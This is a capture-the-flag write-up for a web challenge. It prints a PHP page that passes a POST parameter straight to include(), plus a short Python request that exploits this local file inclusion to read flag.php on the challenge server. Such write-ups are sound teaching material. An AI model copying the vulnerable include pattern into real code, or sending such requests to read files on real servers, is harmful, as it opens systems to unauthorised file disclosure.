# Alient inclusion (web, 50p, 149 solved)

## Description

```
Keep it local and you should be fine. The flag is in /var/www/html/flag.php.

Flag format: CTF{sha256}
```

In the task we get access to a simple webpage.

## Task analysis

Webpage displays the source:

```php
<?php

if (!isset($_GET['start'])){
    show_source(__FILE__);
    exit;
} 

include ($_POST['start']);
echo $secret; 
```

## Solution

Initially it seemed problematic.
We can include given file, but how do we assign the variable?
We can't include a remote file.

It turned out to be much simpler, we just run:

```python
url = "http://34.89.211.188:32193/?start"
r = requests.post(url, data={"start": "/var/www/html/flag.php"})
print(r.text)
```

And get: `ctf{b513ef6d1a5735810bca608be42bda8ef28840ee458df4a3508d25e4b706134d}`
